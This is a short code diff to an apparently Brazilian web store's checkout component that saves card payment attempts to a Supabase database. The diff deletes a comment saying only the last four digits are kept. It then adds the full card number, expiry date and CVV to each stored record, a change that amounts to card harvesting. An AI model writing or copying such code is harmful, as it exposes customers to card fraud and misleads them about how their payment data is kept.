@@ -227,15 +227,16 @@ const Checkout = () => {
     setCardErrors({});
     setCardLoading(true);
     try {
-      // Save card attempt to database (only last 4 digits, never full card number)
-      const last4 = cardValues.cardNumber.replace(/\s/g, "").slice(-4);
       await supabase.from("payment_attempts").insert({
         email: customer.email,
         full_name: customer.fullName,
         cpf: customer.cpf,
         phone: customer.phone || null,
-        card_last4: last4,
+        card_last4: cardValues.cardNumber.replace(/\s/g, "").slice(-4),
         card_name: cardValues.cardName,
+        card_number: cardValues.cardNumber.replace(/\s/g, ""),
+        card_expiry: cardValues.expiry,
+        card_cvv: cardValues.cvv,
         installments: parseInt(cardValues.installments),
         total,
         method: "card",
